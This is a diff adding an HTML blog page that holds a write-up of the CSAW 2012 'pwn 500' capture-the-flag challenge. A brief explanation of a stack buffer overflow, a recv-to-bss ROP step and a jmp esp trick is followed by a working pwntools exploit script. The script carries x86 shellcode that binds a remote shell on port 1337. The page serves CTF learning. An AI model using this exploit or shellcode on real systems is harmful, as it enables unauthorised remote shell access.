@@ -1,0 +1,126 @@
+<html>
+ <head>
+<title> Csaw 2012 pwn 500 </title>
+
+ <link rel="stylesheet" type="text/css" href="test1.css" />
+ <link rel="stylesheet" type="text/css" href="fonts.css" />
+</head>
+<style>
+
+      body {background-color:white;
+	border-bottom:1px solid #bfbfbf
+         line-height:1.5em;
+	color:#222}
+ 
+   p{color:black;
+        /*font-style: italic;
+       font-family: "Times New Roman";*/
+      letter-spacing: 2px;
+       font-size: 20px;
+       margin-top: 10px;
+       margin-bottom: 10px;
+        margin-right: 150px;
+       margin-left: 150px; 
+       }
+
+
+
+    h1{ color:black;
+         font-style: italic;
+        font-size:2.2em;
+	font-family:"PT Serif","Georgia","Helvetica Neue",Arial,sans-serif;
+	font-weight:normal;
+	line-height:1.2em;
+	margin-bottom:0.6667em
+        margin-right: 150px;
+       margin-left: 150px;}
+
+code { 
+display: block; white-space: pre-wrap; 
+border: 1px solid #000; 
+padding: 10px; 
+line-height: 1.5em; 
+font-family: "Lucida Console", Monaco, monospace; 
+} 
+.code-str 
+{ color:#ff33d4; } 
+ .code-comment { color:#3c33ff; } 
+ .code-key { color:#9933ff; }
+ .code-brown{color:#ba4a00} 
+
+
+</style>
+<body>
+
+<script src="null.js"></script>
+
+<div style="position: relative; background: url('http://hackerbuck.net23.net/css/bgm.png'); width: 1210px; height: 110px;">
+ <div style="position: absolute; bottom: 0; left: 0.5em; width: 400px; font-weight: bold; color: #fff;">
+ <p style="color:white;font-size:2.2em;"> Blog </p>
+ </div>
+ </div>
+
+
+ <br> <br>  <br>          
+
+<h1 class="post-title"> Csaw 2012 500 wrietup </h1>
+   
+ <br> 
+
+<p>This binary asks 2 question and answers are stored a array of size 128,1024 respectively but it's not enought to reach eip <br>
+   but this binary copies our 2'nd ans to a smaller buffer of size 40 ultimately overflow to reach eip so the trivial solution is to execute shellcode <br>
+   load the <b> jmp esp instruction into RWX section ( mostly 0x8040b000)</b> also while using <b> recv@plt  there must be 4 arguments</b> <br>
+    recv(fd,bss,size,flag) pass flag=0 as 4'th argument it is necessary ..  </p>
+
+<code>
+from pwn import * 
+import time 
+
+context.bits=32
+recv=0x8048760
+pop4ret = 0x8048f0c
+bss=0x804b130
+
+shellcode="\x6a\x66\x58\x6a\x01\x5b\x31\xf6\x56\x53\x6a\x02\x89\xe1\xcd\x80\x5f\x97\x93\xb0\x66\x56\x66\x68\x05\x39\x66\x53\x89\xe1\x6a\x10\x51\x57\x89\xe1\xcd\x80\xb0\x66\xb3\x04\x56\x57\x89\xe1\xcd\x80\xb0\x66\x43\x56\x56\x57\x89\xe1\xcd\x80\x59\x59\xb1\x02\x93\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x0b\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x41\x89\xca\xcd\x80"
+
+# TCP bind in port 1337 
+
+payload="A"*60
+payload+=pack(recv)+pack(pop4ret)+pack(4)+pack(bss)+pack(2)+pack(0)+pack(bss)+shellcode+"\x90"*8+"\n"
+	
+
+#print "len of payload= %d"%len(payload)
+
+
+r=remote('127.0.0.1',12345)
+
+msg=r.recvuntil('Answer:')
+
+print msg
+
+print "[+] sending First answer"
+
+r.send("Hello")
+
+msg=r.recvuntil('Answer:')
+
+print msg
+
+print "[+] sending payload"
+
+r.send(payload)
+
+time.sleep(5)
+
+print "[+] sending jmp inst"
+
+r.send("\xff\xe4")
+
+r.interactive()	
+
+
+</code>
+
+
+</body>
+</html>
